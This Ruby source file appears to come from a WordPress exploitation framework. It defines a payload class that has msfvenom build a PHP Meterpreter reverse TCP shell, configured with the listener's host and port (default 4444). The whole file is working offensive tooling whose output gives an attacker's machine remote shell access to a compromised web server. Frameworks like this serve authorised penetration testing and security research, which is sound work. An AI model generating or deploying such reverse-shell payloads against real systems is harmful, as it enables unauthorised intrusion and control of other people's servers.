module Wpxf::Payloads
  # A Meterpreter reverse TCP payload generator.
  class MeterpreterReverseTcp < Wpxf::Payload
    include Wpxf
    include Wpxf::Options
    include Wpxf::Payloads::MsfVenomHelper

    def initialize
      super

      register_msfvenom_options
      register_options([
        StringOption.new(
          name: 'lhost',
          required: true,
          desc: 'The address of the host listening for a connection'
        ),
        PortOption.new(
          name: 'lport',
          required: true,
          default: 4444,
          desc: 'The port being used to listen for incoming connections'
        )
      ])
    end

    def host
      escape_single_quotes(datastore['lhost'])
    end

    def lport
      normalized_option_value('lport')
    end

    def raw
      msfvenom_payload
    end

    def prepare(mod)
      generate_msfvenom_payload(mod, 'php/meterpreter/reverse_tcp', "LHOST=#{host}", "LPORT=#{lport}")
    end
  end
end
